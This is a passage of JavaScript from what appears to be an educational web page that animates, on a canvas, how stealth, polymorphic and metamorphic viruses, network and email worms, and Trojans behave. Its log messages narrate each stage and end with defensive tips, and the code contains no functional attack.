        ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 9px monospace';
        ctx.fillText('DISK STORAGE', diskX, diskY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('explorer.exe', diskX, diskY - 5);
        ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 7px monospace';
        ctx.fillText('INFECTED BYTES', diskX, diskY + 15);
        if (frame > 80) {
            ctx.beginPath(); ctx.moveTo(avX + 45, avY - 10); ctx.lineTo(driverX - 55, driverY - 10);
            ctx.strokeStyle = '#00f0ff'; ctx.stroke();
            ctx.fillStyle = '#00f0ff'; ctx.font = '7px monospace';
            ctx.fillText('ReadReq', (avX + driverX) / 2, avY - 15);
        }
        if (frame > 140) {
            ctx.fillStyle = 'rgba(57, 255, 20, 0.08)'; ctx.strokeStyle = '#39ff14';
            ctx.beginPath(); ctx.roundRect(driverX - 45, driverY + 55, 90, 24, 3); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 7px monospace';
            ctx.fillText('CLEAN FILE CACHE', driverX, driverY + 68);
            ctx.beginPath(); ctx.moveTo(driverX, driverY + 40); ctx.lineTo(driverX, driverY + 55);
            ctx.strokeStyle = '#39ff14'; ctx.stroke();
            ctx.beginPath(); ctx.moveTo(driverX - 45, driverY + 65); ctx.lineTo(avX, avY + 40);
            ctx.strokeStyle = '#39ff14'; ctx.stroke();
            ctx.fillStyle = '#39ff14'; ctx.font = '7px monospace';
            ctx.fillText('Clean Data Output', (avX + driverX - 20) / 2, avY + 60);
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = hooks;
            if (e1) e1.textContent = spoofs;
            if (e2) e2.textContent = `${bytesSpoofed} KB`;
            if (e3) e3.textContent = `${Math.round(frame / 6)} days`;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Stealth virus spoofed scanner successfully. Run offline scans to clean!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulatePolymorphicVirus = function() {
    termLog('> Loading signature analyzer and emulated sandbox...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, sigs = 0, keys = 0, stubs = 0, misses = 0;
    const replicationFiles = [
        { name: 'app1.exe', key: '0x992B', color: '#ff3b3b', status: 'clean' },
        { name: 'sys2.exe', key: '0xE14F', color: '#ffaa00', status: 'clean' },
        { name: 'run3.exe', key: '0x5C80', color: '#8b5cf6', status: 'clean' }
    ];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Executed polymorphic routine. Generates a new 16-bit key: 0x992B.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Payload encrypted. Polymorphic engine modifies decryptor stub structures.', 'error'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Writing unique signature sequence to run3.exe. AV signatures bypassed!', 'error'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Heuristic sandbox detects dynamic memory execution loop! Caught payload.', 'success'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('POLYMORPHIC MUTATION & SANDBOX DECRYPTION', w / 2, 22);
        const pX = w * 0.18, pY = h * 0.45;
        ctx.fillStyle = 'rgba(255, 59, 59, 0.15)'; ctx.strokeStyle = '#ff3b3b';
        ctx.beginPath(); ctx.roundRect(pX - 45, pY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 9px monospace';
        ctx.fillText('CORE PAYLOAD', pX, pY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Static instructions', pX, pY - 5);
        ctx.fillText('Signature: [A3 B9 22]', pX, pY + 15);
        const engX = w * 0.5, engY = h * 0.45;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(engX - 55, engY - 40, 110, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#fff'; ctx.font = 'bold 8px monospace';
        ctx.fillText('MUTATION ENGINE', engX, engY - 20);
        ctx.fillStyle = '#ffaa00'; ctx.font = '7px monospace';
        if (frame > 40) {
            ctx.fillText('KEY: ' + (frame > 140 ? '0xE14F' : '0x992B'), engX, engY - 5);
            ctx.fillText('Encrypting...', engX, engY + 10);
            ctx.fillText('Generating Stub...', engX, engY + 22);
            keys = frame > 140 ? 2 : 1;
            stubs = keys;
        }
        ctx.beginPath(); ctx.moveTo(pX + 45, pY); ctx.lineTo(engX - 55, engY);
        ctx.strokeStyle = '#ff3b3b'; ctx.stroke();
        replicationFiles.forEach((file, idx) => {
            const fx = w * 0.8, fy = h * 0.25 + idx * 75;
            const activeInfect = frame > 80 + idx * 60;
            if (activeInfect && file.status === 'clean') {
                file.status = 'infected';
                sigs++;
                misses++;
                termLog(`> Created mutated signature for host file ${file.name}. Key: ${file.key}`, 'error');
            }

            ctx.fillStyle = file.status === 'infected' ? 'rgba(255, 255, 255, 0.02)' : 'rgba(255, 255, 255, 0.01)';
            ctx.strokeStyle = file.status === 'infected' ? file.color : 'rgba(255, 255, 255, 0.05)';
            ctx.beginPath(); ctx.roundRect(fx - 50, fy - 22, 100, 44, 4); ctx.fill(); ctx.stroke();

            ctx.fillStyle = file.status === 'infected' ? '#fff' : '#525c70'; ctx.font = 'bold 8px monospace';
            ctx.fillText(file.name, fx, fy - 10);
            ctx.fillStyle = file.status === 'infected' ? file.color : '#525c70'; ctx.font = '7px monospace';
            ctx.fillText(file.status === 'infected' ? `Stub: [${file.key.slice(2,4)} F9]` : 'CLEAN', fx, fy + 2);
            ctx.fillText(file.status === 'infected' ? `Encrypted Body` : '', fx, fy + 12);

            if (file.status === 'infected') {
                ctx.beginPath(); ctx.moveTo(engX + 55, engY); ctx.lineTo(fx - 50, fy);
                ctx.strokeStyle = file.color; ctx.stroke();
            }
        });
        if (frame > 280) {
            ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5;
            ctx.strokeRect(w * 0.7, h * 0.15, w * 0.25, h * 0.7);
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 9px monospace';
            ctx.fillText('EMULATED SANDBOX', w * 0.82, h * 0.89);
            ctx.fillText('[DECRYPTED & DETECTED]', w * 0.82, h * 0.12);
            misses = Math.max(0, misses - 1);
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = sigs;
            if (e1) e1.textContent = keys;
            if (e2) e2.textContent = stubs;
            if (e3) e3.textContent = misses;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Static signature scans failed. Emulated sandbox heuristics caught the virus!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateMetamorphicVirus = function() {
    termLog('> Spawning disassembler and rewriting engines...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, rewrites = 0, junks = 0, swaps = 0;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Decompiling payload binary to intermediate representation...', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Register allocator: swapping EAX/EBX, mapping intermediate logic...', 'error'); swaps = 8; }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Dead-code inserting: NOP codes and junk JMP structures appended...', 'error'); junks = 44; }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Binary reassembled. Created unique instruction code blocks!', 'success'); rewrites = 1; }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('METAMORPHIC CODE REWRITING & REASSEMBLY', w / 2, 22);
        const aX = w * 0.22, aY = h * 0.52, aW = 140, aH = 140;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(aX - aW / 2, aY - aH / 2, aW, aH, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('ORIGINAL BINARY (A)', aX, aY - aH / 2 - 6);
        ctx.fillStyle = '#e8ecf4'; ctx.font = '8px monospace'; ctx.textAlign = 'left';
        ctx.fillText('1:  MOV EAX, 0', aX - aW / 2 + 10, aY - 40);
        ctx.fillText('2:  ADD EAX, EDX', aX - aW / 2 + 10, aY - 20);
        ctx.fillText('3:  MOV [EBX], EAX', aX - aW / 2 + 10, aY);
        ctx.fillText('4:  JMP short 0x12', aX - aW / 2 + 10, aY + 20);
        ctx.fillText('5:  RET', aX - aW / 2 + 10, aY + 40);
        const eX = w * 0.5, eY = h * 0.5;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
        ctx.beginPath(); ctx.arc(eX, eY, 32, 0, Math.PI * 2); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ffaa00'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('REWRITE', eX, eY - 4);
        ctx.fillText('ENGINE', eX, eY + 6);
        if (frame > 20) {
            ctx.beginPath(); ctx.arc(eX, eY, 36, -Math.PI / 2, -Math.PI / 2 + (frame % 100 / 100) * Math.PI * 2);
            ctx.strokeStyle = '#ffaa00'; ctx.lineWidth = 2; ctx.stroke();
        }
        const bX = w * 0.78, bY = h * 0.52, bW = 140, bH = 140;
        ctx.fillStyle = 'rgba(255, 59, 59, 0.04)'; ctx.strokeStyle = frame > 120 ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(bX - bW / 2, bY - bH / 2, bW, bH, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = frame > 120 ? '#ff3b3b' : '#8892a8'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('METAMORPHIC BINARY (B)', bX, bY - bH / 2 - 6);
        ctx.fillStyle = frame > 120 ? '#ff3b3b' : '#525c70'; ctx.font = '8px monospace'; ctx.textAlign = 'left';
        
        if (frame > 120) {
            ctx.fillText('1:  XOR EBX, EBX', bX - bW / 2 + 10, bY - 45);
            ctx.fillText('2:  NOP', bX - bW / 2 + 10, bY - 30);
            ctx.fillText('3:  ADD EBX, EDX', bX - bW / 2 + 10, bY - 15);
            ctx.fillText('4:  MOV [ECX], EBX', bX - bW / 2 + 10, bY);
            ctx.fillText('5:  JMP short 0x16', bX - bW / 2 + 10, bY + 15);
            ctx.fillText('6:  NOP', bX - bW / 2 + 10, bY + 30);
            ctx.fillText('7:  RET', bX - bW / 2 + 10, bY + 45);
        } else {
            ctx.fillText('Pending reassembly...', bX - bW / 2 + 10, bY);
        }
        if (frame > 30) {
            ctx.beginPath(); ctx.moveTo(aX + aW / 2, aY); ctx.lineTo(eX - 32, eY);
            ctx.strokeStyle = '#ffaa00'; ctx.lineWidth = 1; ctx.stroke();
        }
        if (frame > 120) {
            ctx.beginPath(); ctx.moveTo(eX + 32, eY); ctx.lineTo(bX - bW / 2, bY);
            ctx.strokeStyle = '#ff3b3b'; ctx.lineWidth = 1.5; ctx.stroke();
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = rewrites;
            if (e1) e1.textContent = frame > 160 ? `${junks} lines` : '0 lines';
            if (e2) e2.textContent = frame > 90 ? swaps : 0;
            if (e3) e3.textContent = frame > 240 ? '0% (sig bypassed)' : '100%';
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Metamorphic virus successfully rewrote structure. Signature scans bypassed completely!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateWormGeneral = function() {
    termLog('> Scanning local subnet ranges...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, scanned = 0, exploits = 0, infects = 0, traffic = 0;
    const nodes = [
        { label: 'Host A (Gateway)', x: w * 0.5, y: h * 0.18, status: 'infected' },
        { label: 'Host B', x: w * 0.18, y: h * 0.45, status: 'clean' },
        { label: 'Host C', x: w * 0.38, y: h * 0.48, status: 'clean' },
        { label: 'Host D', x: w * 0.62, y: h * 0.48, status: 'clean' },
        { label: 'Host E', x: w * 0.82, y: h * 0.45, status: 'clean' },
        { label: 'Host F (DB Server)', x: w * 0.5, y: h * 0.78, status: 'clean' }
    ];
    const packets = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Gateway infected. Initiating local scanning daemon...', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Found open Port 445 on Host B, Host D, Host F.', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Sending EternalBlue SMB exploit packets to targets...', 'error'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Shell commands executed. Worm files transfered. Lateral movement success!', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('WORM NETWORK REPLICATION & LATERAL MOVEMENT', w / 2, 22);
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.04)'; ctx.lineWidth = 1;
        for (let i = 0; i < nodes.length; i++) {
            for (let j = i + 1; j < nodes.length; j++) {
                ctx.beginPath(); ctx.moveTo(nodes[i].x, nodes[i].y); ctx.lineTo(nodes[j].x, nodes[j].y); ctx.stroke();
            }
        }
        if (frame > 40 && frame % 12 === 0) {
            const infNodes = nodes.filter(n => n.status === 'infected');
            const cleanNodes = nodes.filter(n => n.status === 'clean');
            if (infNodes.length > 0 && cleanNodes.length > 0) {
                const src = infNodes[rndInt(0, infNodes.length)];
                const dest = cleanNodes[rndInt(0, cleanNodes.length)];
                packets.push({ x: src.x, y: src.y, tx: dest.x, ty: dest.y, p: 0, target: dest, type: 'scan' });
                scanned += 4;
                traffic = Math.min(100, traffic + 1.5);
            }
        }
        if (frame === 140) {
            const target = nodes[1]; // Host B
            packets.push({ x: nodes[0].x, y: nodes[0].y, tx: target.x, ty: target.y, p: 0, target: target, type: 'exploit' });
            exploits++;
        }
        if (frame === 200) {
            const target = nodes[3]; // Host D
            packets.push({ x: nodes[0].x, y: nodes[0].y, tx: target.x, ty: target.y, p: 0, target: target, type: 'exploit' });
            exploits++;
        }
        if (frame === 260) {
            const target = nodes[5]; // Host F
            packets.push({ x: nodes[3].x, y: nodes[3].y, tx: target.x, ty: target.y, p: 0, target: target, type: 'exploit' });
            exploits++;
        }
        packets.forEach(p => {
            p.p += 0.035;
            const px = p.x + (p.tx - p.x) * p.p;
            const py = p.y + (p.ty - p.y) * p.p;
            ctx.beginPath(); ctx.arc(px, py, p.type === 'exploit' ? 5 : 3, 0, Math.PI * 2);
            ctx.fillStyle = p.type === 'exploit' ? '#ff3b3b' : '#ffaa00'; ctx.fill();
            if (p.p >= 1) {
                if (p.type === 'exploit') {
                    p.target.status = 'infected';
                    infects++;
                    traffic = Math.min(1000, traffic + 120);
                    termLog(`> Exploit verified on ${p.target.label}. Payload executed!`, 'error');
                }
                p.dead = true;
            }
        });
        for (let i = packets.length - 1; i >= 0; i--) {
            if (packets[i].dead) packets.splice(i, 1);
        }
        nodes.forEach(n => {
            const isInfected = n.status === 'infected';
            ctx.shadowBlur = isInfected ? 12 : 0; ctx.shadowColor = '#ffaa00';
            ctx.beginPath(); ctx.arc(n.x, n.y, 16, 0, Math.PI * 2);
            ctx.fillStyle = isInfected ? 'rgba(255, 170, 0, 0.2)' : 'rgba(255, 255, 255, 0.03)'; ctx.fill();
            ctx.strokeStyle = isInfected ? '#ffaa00' : 'rgba(255, 255, 255, 0.15)'; ctx.lineWidth = 1.5; ctx.stroke();
            ctx.shadowBlur = 0;

            ctx.fillStyle = isInfected ? '#ffaa00' : '#8892a8'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
            ctx.fillText(n.label, n.x, n.y + 26);
        });

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = scanned;
            if (e1) e1.textContent = exploits;
            if (e2) e2.textContent = infects + 1; // plus initial
            if (e3) e3.textContent = `${traffic.toFixed(1)} Mbps`;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Standalone network worm propagated. Enable internal segment firewalls!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateEmailWorm = function() {
    termLog('> Initializing Outlook MAPI connectors...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, addresses = 0, dispatched = 0, connections = 0, inboxInfects = 0;
    const inboxList = [
        { email: 'hr.manager@corp.com', status: 'pending' },
        { email: 'systems.eng@corp.com', status: 'pending' },
        { email: 'sales.dept@corp.com', status: 'pending' }
    ];
    const mails = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Address book parsed: 128 targets acquired.', 'warning'); addresses = 128; }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Initializing SMTP session with mail.corporate.com...', 'warning'); connections = 1; }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Broadcasting emails with update.pdf.exe payload attachment...', 'error'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Mail recipients executed attachment. Worm propagation loop triggered.', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('SMTP BROADCAST & TARGET INBOX MULTIPLICATION', w / 2, 22);
        const hostX = w * 0.18, hostY = h * 0.5;
        const smtpX = w * 0.5, smtpY = h * 0.5;
        const targetX = w * 0.82;
        ctx.fillStyle = 'rgba(255, 170, 0, 0.15)'; ctx.strokeStyle = '#ffaa00';
        ctx.beginPath(); ctx.roundRect(hostX - 45, hostY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ffaa00'; ctx.font = 'bold 9px monospace';
        ctx.fillText('INFECTED PC', hostX, hostY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Outlook client', hostX, hostY - 5);
        ctx.fillText('Worm: active', hostX, hostY + 15);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(smtpX - 45, smtpY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#fff'; ctx.font = 'bold 9px monospace';
        ctx.fillText('SMTP SERVER', smtpX, smtpY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('mail.corp.com', smtpX, smtpY - 5);
        ctx.fillStyle = connections > 0 ? '#39ff14' : '#525c70'; ctx.font = 'bold 7px monospace';
        ctx.fillText(connections > 0 ? '[PORT 25 OPEN]' : '[STANDBY]', smtpX, smtpY + 15);
        if (frame > 60 && frame % 15 === 0 && dispatched < 60) {
            mails.push({ x: hostX + 45, y: hostY, tx: smtpX - 45, ty: smtpY, p: 0, type: 'to-server' });
            dispatched++;
        }
        if (frame > 140 && frame % 20 === 0) {
            const destIdx = Math.floor(frame / 20) % inboxList.length;
            const destY = h * 0.25 + destIdx * 75;
            mails.push({ x: smtpX + 45, y: smtpY, tx: targetX - 50, ty: destY, p: 0, type: 'to-target', target: inboxList[destIdx] });
        }
        mails.forEach(m => {
            m.p += 0.035;
            const mx = m.x + (m.tx - m.x) * m.p;
            const my = m.y + (m.ty - m.y) * m.p;
            ctx.beginPath(); ctx.rect(mx - 6, my - 4, 12, 8);
            ctx.fillStyle = '#ffaa00'; ctx.fill();
            ctx.strokeStyle = '#fff'; ctx.lineWidth = 0.5; ctx.stroke();
            if (m.p >= 1) {
                if (m.type === 'to-target' && m.target.status === 'pending') {
                    m.target.status = 'infected';
                    inboxInfects++;
                    termLog(`> Inbound email loaded on ${m.target.email}. Attachment execution triggered!`, 'error');
                }
                m.dead = true;
            }
        });
        for (let i = mails.length - 1; i >= 0; i--) {
            if (mails[i].dead) mails.splice(i, 1);
        }
        inboxList.forEach((inb, idx) => {
            const ty = h * 0.25 + idx * 75;
            const isInf = inb.status === 'infected';
            ctx.fillStyle = isInf ? 'rgba(255, 59, 59, 0.15)' : 'rgba(255, 255, 255, 0.01)';
            ctx.strokeStyle = isInf ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)';
            ctx.beginPath(); ctx.roundRect(targetX - 50, ty - 22, 100, 44, 4); ctx.fill(); ctx.stroke();

            ctx.fillStyle = isInf ? '#ff3b3b' : '#8892a8'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
            ctx.fillText(inb.email.split('@')[0], targetX, ty - 8);
            ctx.fillStyle = isInf ? '#ff3b3b' : '#525c70'; ctx.font = '7px monospace';
            ctx.fillText(isInf ? '[WORM SPAWNED]' : '[PENDING]', targetX, ty + 10);
        });

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = addresses;
            if (e1) e1.textContent = dispatched * 2; // multiply for display
            if (e2) e2.textContent = connections;
            if (e3) e3.textContent = inboxInfects;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Email worm mass dispatch complete. Deploy SPF validation on gateways!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateTrojanGeneral = function() {
    termLog('> Packaging wrapper payload installer...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, downloads = 0, consent = 'Granted', hiddenProcs = 0;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Wrapped installer SuperPDF.msi published on unofficial web portal.', 'warning'); downloads = 280; }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> User downloaded and ran SuperPDF installer wrapper.', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> MSI installs normal PDF viewer. Spawning helper process: pdfhelper.exe...', 'error'); hiddenProcs = 1; }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> pdfhelper.exe registers startup run keys. Initiating C2 socket link...', 'error'); hiddenProcs = 2; }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('WRAPPER INSTALLATION & VISUAL DISGUISE', w / 2, 22);
        const instX = w * 0.15, instY = h * 0.35, instW = 120, instH = 80;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(instX, instY, instW, instH, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'left';
        ctx.fillText('SuperPDF.msi', instX + 8, instY + 16);
        ctx.fillStyle = '#525c70'; ctx.font = '7px monospace';
        ctx.fillText('Size: 45.2 MB', instX + 8, instY + 34);
        ctx.fillText('Signer: Unverified', instX + 8, instY + 48);
        ctx.fillStyle = '#00f0ff'; ctx.font = 'bold 7px monospace';
        ctx.fillText('[DISGUISE: PDF APP]', instX + 8, instY + 68);
        const uiX = w * 0.46, uiY = h * 0.28, uiW = 120, uiH = 90;
        const isUiRunning = frame > 80;
        ctx.fillStyle = isUiRunning ? 'rgba(57, 255, 20, 0.05)' : 'rgba(255, 255, 255, 0.01)';
        ctx.strokeStyle = isUiRunning ? '#39ff14' : 'rgba(255, 255, 255, 0.05)';
        ctx.beginPath(); ctx.roundRect(uiX, uiY, uiW, uiH, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isUiRunning ? '#39ff14' : '#525c70'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'left';
        ctx.fillText('SuperPDF Reader v1.0', uiX + 8, uiY + 16);
        ctx.fillStyle = isUiRunning ? '#8892a8' : '#525c70'; ctx.font = '7px monospace';
        if (isUiRunning) {
            ctx.fillText('Reading: invoice.pdf', uiX + 8, uiY + 34);
            ctx.fillStyle = 'rgba(255,255,255,0.05)';
            ctx.fillRect(uiX + 8, uiY + 45, uiW - 16, 32); // text simulation blocks
            ctx.fillStyle = '#39ff14'; ctx.fillText('User view: CLEAN', uiX + 8, uiY + 84);
        } else {
            ctx.fillText('Waiting for wrapper...', uiX + 8, uiY + 34);
        }
        if (isUiRunning) {
            ctx.beginPath(); ctx.moveTo(instX + instW, instY + instH / 2); ctx.lineTo(uiX, uiY + uiH / 2);
            ctx.strokeStyle = '#00f0ff'; ctx.stroke();
        }
        const malX = w * 0.72, malY = h * 0.52, malW = 120, malH = 90;
        const isMalRunning = frame > 130;
        ctx.fillStyle = isMalRunning ? 'rgba(255, 59, 59, 0.12)' : 'rgba(255, 255, 255, 0.01)';
        ctx.strokeStyle = isMalRunning ? '#ff3b3b' : 'rgba(255, 255, 255, 0.05)';
        ctx.beginPath(); ctx.roundRect(malX, malY, malW, malH, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isMalRunning ? '#ff3b3b' : '#525c70'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'left';
        ctx.fillText('pdfhelper.exe (HIDDEN)', malX + 8, malY + 16);
        ctx.fillStyle = isMalRunning ? '#ff3b3b' : '#525c70'; ctx.font = '7px monospace';
        if (isMalRunning) {
            ctx.fillText('> Allocating sockets...', malX + 8, malY + 34);
            ctx.fillText('> Injecting DLL hooks...', malX + 8, malY + 48);
            ctx.fillText('> C2 Beaconing active', malX + 8, malY + 62);
            ctx.fillText('[BACKDOOR ACTIVE]', malX + 8, malY + 80);
        } else {
            ctx.fillText('Waiting for wrapper...', malX + 8, malY + 34);
        }

        if (isMalRunning) {
            ctx.beginPath(); ctx.moveTo(uiX + uiW / 2, uiY + uiH); ctx.lineTo(malX + malW / 2, malY);
            ctx.strokeStyle = '#ff3b3b'; ctx.stroke();
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = 'Excellent';
            if (e1) e1.textContent = downloads + Math.round(frame * 1.5);
            if (e2) e2.textContent = consent;
            if (e3) e3.textContent = hiddenProcs;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Disguised Trojan payload loaded. Check installer digital signatures!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulatePassiveTrojan = function() {
    termLog('> Binding listener network sockets...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, listeningPorts = 9999, rulesInjected = 0, egress = '0 B', inbound = 0;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Bound listener to TCP socket Port 9999.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Modifying system firewall: injected inbound exception for Port 9999.', 'error'); rulesInjected = 1; }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Trojan socket transitioned to LISTEN status. Waiting for incoming shell connection...', 'warning'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Incoming request from client: Attacker established session. Interactive CLI active!', 'error'); inbound = 1; }, 3000);

    function draw() {
